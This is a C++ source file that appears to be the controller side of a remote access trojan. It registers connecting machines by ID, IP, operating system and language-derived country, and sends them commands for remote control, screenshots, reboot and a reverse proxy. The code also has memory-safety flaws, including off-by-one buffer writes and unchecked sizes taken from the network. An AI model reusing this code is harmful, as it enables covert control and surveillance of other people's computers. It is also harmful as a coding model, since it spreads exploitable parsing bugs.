#include "Client_Handler.h"



Client_Handler::Client_Handler()
{
	//	si.Connections = new SOCKET[100];

}


Client_Handler::~Client_Handler()
{

}


int Client_Handler::Handle_Client(int i, Packet_Handler* _Handle)
{
	//Remote_Handler* _rHandle = new Remote_Handler();
	int pType = NULL;
	recv(_Handle->si.ClientSocket, (char*)&pType, sizeof(int), 0);

	if (pType == NULL)
	{

		_Handle->si.Connections[i].s[0] = _Handle->si.ClientSocket;

		int SizeID = 0;
		recv(_Handle->si.Connections[i].s[0], (char*)&SizeID, sizeof(int), 0);

		char* ClientID = new char[SizeID];
		ClientID[SizeID] = '\0';
		recv(_Handle->si.Connections[i].s[0], (char*)ClientID, SizeID, 0);

		mbstowcs(_Handle->si.Connections[i].Clients->_ClientID, ClientID, SizeID + 1);
		int SizeIP = 0;
		recv(_Handle->si.Connections[i].s[0], (char*)&SizeIP, sizeof(int), 0);
		if (SizeIP < 256)
		{
			char *IP = new char[SizeIP];
			IP[SizeIP] = '\0';
			recv(_Handle->si.Connections[i].s[0], (char*)IP, SizeIP, 0);
			mbstowcs(_Handle->si.Connections[i].Clients->_IPAdress, IP, SizeIP + 1);
		}
		//delete[] ClientID;
		int SizeOS = 0;
		recv(_Handle->si.Connections[i].s[0], (char*)&SizeOS, sizeof(int), 0);
		char *OS = new char[SizeOS];
		//	OS[SizeOS] = '\0';
		recv(_Handle->si.Connections[i].s[0], (char*)OS, SizeOS, 0);
		mbstowcs(_Handle->si.Connections[i].Clients->_OperatingSystem, OS, SizeOS + 1);

		int LANGID = NULL;
		recv(_Handle->si.Connections[i].s[0], (char*)&LANGID, sizeof(int), 0);
		_Handle->si.Connections[i].Clients->_Country = GetLangFromID(LANGID);

		return 0;
	}
	else if (pType == 2)
	{
		//recv(_Handle->si.ClientSocket, (char*)&WhichConnection, sizeof(INT), 0);
		_Handle->si.Connections[_Handle->Clicked_Item].s[2] = _Handle->si.ClientSocket;
		//_rHandle->Remote_Administration(_Handle);
		SendMessage(_Handle->mhWnd, WM_COMMAND, MAKEWPARAM(IDM_REMOTEINIT, 0), NULL);

		return 2;
	}
	else if (pType == 5)
	{
		_Handle->si.Connections[_Handle->Clicked_Item].s[5] = _Handle->si.ClientSocket;
		SendMessage(_Handle->mhWnd, WM_COMMAND, MAKEWPARAM(IDM_SCREENY, NULL), NULL);
		return 5;

	}
	else if (pType == 7)
	{
		
		_Handle->si.Connections[_Handle->si.picked].s[7] = _Handle->si.ClientSocket;
		SendMessage(_Handle->mhWnd, WM_COMMAND, MAKEWPARAM(IDM_RPROX, NULL), NULL);


		return 7;
	}
}

VOID Client_Handler::Multi_Client_Helper(Packet_Handler* _Handle, int iDetails, int iPacketType, int i)
{
	switch (iDetails)
	{
	case Remote:
	{
		int rMote = Remote;
		send(_Handle->si.Connections[i].s[0], (char*)&rMote, sizeof(int), 0);
		//_rHandle->Remote_Administration(_Handle);
		//send(_Handle->si.Connections[i].s[0], (char*)&i, sizeof(int), 0);
		break;
	}
	case Quit:
	{
		int qUit = Quit;
		send(_Handle->si.Connections[i].s[0], (char*)&qUit, sizeof(int), 0);
		break;
	}
	case Screeny:
	{
		int screeny = Screeny;
		send(_Handle->si.Connections[i].s[0], (char*)&screeny, sizeof(int), 0);
		break;
	}
	case Reboot:
	{
		int rBoot = Reboot;
		send(_Handle->si.Connections[i].s[0], (char*)&rBoot, sizeof(int), 0);
		break;
	}
	case RProxy:
	{
		int rProx = RProxy;
		send(_Handle->si.Connections[i].s[0], (char*)&rProx, sizeof(int), 0);
		break;
	}
	}
}
int Client_Handler::Refresh_Client_List(Packet_Handler* _Handle)
{
	int tempConnections[100] = { 0 };
	int j = -1;
	for (int i = 0; i < 100; i++)
	{
		int nada = NULL;

		if (send(_Handle->si.Connections[i].s[0], (char*)&nada, sizeof(int), 0) != SOCKET_ERROR)
		{
			j++;
			tempConnections[j] = _Handle->si.Connections[i].s[0];
			_Handle->si.Connections[j].Clients->_ClientID = _Handle->si.Connections[j].Clients->_ClientID;
			_Handle->si.Connections[j].Clients->_IPAdress = _Handle->si.Connections[j].Clients->_IPAdress;
			_Handle->si.Connections[j].Clients->_OperatingSystem = _Handle->si.Connections[j].Clients->_OperatingSystem;
			
		}
		else
		{
			//if (_Handle->Clients[i]._ClientID != nullptr)
			//delete
			_Handle->si.Connections[i].Clients->_ClientID = NULL;
			_Handle->si.Connections[i].Clients->_ClientID =(wchar_t*) malloc(sizeof(wchar_t) *64);
			_Handle->si.Connections[i].Clients->_IPAdress = NULL;
			_Handle->si.Connections[i].Clients->_IPAdress = (wchar_t*)malloc(sizeof(wchar_t) * 256);
			_Handle->si.Connections[i].Clients->_OperatingSystem = NULL;
			_Handle->si.Connections[i].Clients->_OperatingSystem = (wchar_t*)malloc(sizeof(wchar_t) *64);
		}
	}
	if ((_Handle->si.ConnectionCounter - 1) == j) return 0;
	ListView_DeleteAllItems(_Handle->hWndList);
	 _Handle->si.ConnectionCounter = j;
	memcpy(_Handle->si.Connections, tempConnections, sizeof(tempConnections));
	_Handle->Add_List_Items(_Handle);
	_Handle->si.ConnectionCounter++;
	return 0;
}

wchar_t* Client_Handler::GetLangFromID(int ID)
{
	switch (ID)
	{
	case 1025:
		return L"Arabic/Saudi Arabia";
	case 2049:
		return L"Arabic/Iraq";
	case 3073:
		return L"Arabic/Egypt";
	case 4097:
		return L"Arabic/Libya";
	case 5121:
		return L"Arabic/Algeria";
	case 6145:
		return L"Arabic/Morocco";
	case 7169:
		return L"Arabic/Tunisia";
	case 8193:
		return L"Arabic/Oman";
	case 9217:
		return L"Arabic/Yemen";
	case 10241:
		return L"Arabic/Syria";
	case 11265:
		return L"Arabic/Jordan";
	case 12289:
		return L"Arabic/Lebanon";
	case 13313:
		return L"Arabic/Kuwait";
	case 14337:
		return L"Arabic/U.A.E";
	case 15361:
		return L"Arabic/Bahrain";
	case 16385:
		return L"Arabic/Qatar";
	case 1026:
		return L"Bulgarian";
	case 1027:
		return L"Catalan";
	case 1028:
		return L"Chinese/Taiwan";
	case 2052:
		return L"Chinese/PRC";
	case 3076:
		return L"Chinese/Hong Kong";
	case 4100:
		return L"Chinese/Singapore";
	case 1029:
		return L"Czech";
	case 1030:
		return L"Danish";
	case 1031:
		return L"German";
	case 2055:
		return L"German/Swiss";
	case 3079:
		return L"German/Austrian";
	case 4103:
		return L"German/Luxembourg";
	case 5127:
		return L"German/Liechtenstein";
	case 1032:
		return L"Greek";
	case 1033:
		return L"English/United States";
	case 2057:
		return L"English/United Kingdom";
	case 3081:
		return L"English/Australian";
	case 4105:
		return L"English/Canadian";
	case 5129:
		return L"English/New Zealand";
	case 6153:
		return L"Englih/Ireland";
	case 7177:
		return L"Enlglish/South Africa";
	case 8201:
		return L"English/Jamaica";
	case 9225:
		return L"English/Caribbean";
	case 10249:
		return L"English/Belize";
	case 11273:
		return L"English/Trinidad";
	case 1034:
		return L"Spain";
	case 2058:
		return L"Spanish/Mexico";
	case 3082:
		return L"Spain";
	case 4106:
		return L"Spanish/Guatemala";
	case 5130:
		return L"Spanish/Costa Rica";
	case 6154:
		return L"Spanish/Panama";
	case 7178:
		return L"Spanish/Dominican Republic";
	case 8202:
		return L"Spanish/Venezuela";
	case 9226:
		return L"Spanish/Colombia";
	case 10250:
		return L"Spanish/Peru";
	case 11274:
		return L"Spanish/Argentina";
	case 12298:
		return L"Spanish/Ecuador";
	case 13322:
		return L"Spanish/Chile";
	case 14346:
		return L"Spanish/Uraguay";
	case 15370:
		return L"Spanish/Paraguay";
	case 16394:
		return L"Spanish/Bolivia";
	case 17418:
		return L"Spanish/El Salvador";
	case 18442:
		return L"Spanish/Honduras";
	case 19466:
		return L"Spanish/Nicaragua";
	case 20490:
		return L"Spanish/Puerto Rico";
	case 1035:
		return L"Finland";
	case 1036:
		return L"France";
	case 2060:
		return L"French/Belgian";
	case 3084:
		return L"French/Canadian";
	case 4108:
		return L"French/Swiss";
	case 5132:
		return L"French/Luxembourg";


	}



	return NULL;
}